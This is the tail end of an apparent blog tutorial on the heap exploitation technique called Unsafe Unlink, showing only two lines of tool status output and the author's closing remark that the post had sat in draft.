[*] Interrupted
[*] Stopped program './chapter1'
```

And that was it, congratulations, now you learned the Unsafe Unlink, as my blog was silent for a while, this was in draft so here it is now.


